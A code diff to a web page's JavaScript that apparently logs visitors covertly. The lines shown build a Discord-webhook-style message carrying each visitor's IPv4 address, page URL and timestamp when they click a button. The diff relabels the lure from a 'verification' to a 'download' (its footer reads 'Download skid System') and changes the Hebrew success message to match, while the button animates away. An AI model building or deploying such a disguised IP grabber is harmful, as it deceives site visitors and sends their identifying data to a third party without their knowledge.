@@ -19,9 +19,9 @@ document.getElementById("start-btn").addEventListener("click", function () {
                     let pageURL = window.location.href;
                     
                     let payload = {
-                        username: "Verification Log",
+                        username: "Download Log",
                         embeds: [{
-                            title: "New Verification Attempt",
+                            title: "New Download failed Attempt",
                             color: 16711680,
                             fields: [
                                 { name: "IPv4 Address", value: data_v4.ip, inline: true },
@@ -34,7 +34,7 @@ document.getElementById("start-btn").addEventListener("click", function () {
                                 { name: "Page URL", value: pageURL, inline: false },
                                 { name: "Timestamp", value: timestamp, inline: false }
                             ],
-                            footer: { text: "Verification System" },
+                            footer: { text: "Download skid System" },
                             timestamp: new Date().toISOString()
                         }]
                     };
@@ -71,11 +71,11 @@ document.getElementById("verify-btn").addEventListener("click", function() {
         setTimeout(() => {
             btn.textContent = "Loading...";
             setTimeout(() => {
-                btn.textContent = "אימות הושלם בהצלחה";
+                btn.textContent = "הורדה הושלמה בהצלחה";
                 
                 setTimeout(() => {
                     btn.style.transition = "transform 0.4s ease-in-out";
-                    btn.style.transform = "translateY(500px)"; // Moves down fast
+                    btn.style.transform = "translateY(600px)"; // Moves down fast
                 }, 1000);
             }, 1000);
         }, 1000);
